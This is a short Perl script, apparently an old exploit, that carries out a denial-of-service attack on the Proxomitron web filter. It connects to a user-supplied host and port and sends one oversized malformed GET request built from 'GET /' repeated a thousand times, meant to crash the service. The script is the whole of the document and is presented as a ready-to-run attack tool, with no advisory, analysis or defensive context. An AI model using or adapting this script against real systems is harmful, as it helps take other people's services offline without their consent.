#!/usr/bin/perl
#####################################################
#  Proxomitron - Universial Web Filter - Version 3  #
#  Dos Attack.                                      #
#####################################################

use IO::Socket;

$ARGC=@ARGV;
if ($ARGC !=2) {
	print "\n-->";
        print "\tUsage: perl dos-prox.pl <host> <port>\n";
	exit;
}

$vic     = $ARGV[0];          # There IP
$Uport   = $ARGV[1];          # There Web Port
$SendStr = "GET /" x 1000;    # Crash String

print "\n-->";
print "\tCrashing:$vic on:$Uport\n";
unless ($socket2 = IO::Socket::INET->new (Proto => "TCP",
					  PeerAddr => $vic,
					  PeerPort => $Uport))
{
        print "-->";
        print "\tConnection Failed, Stoping.\n";
        exit;
}
print $socket2 "GET $SendStr\n";
close $socket2;

print "-->";
print "\tCrashed:$vic\n";
exit;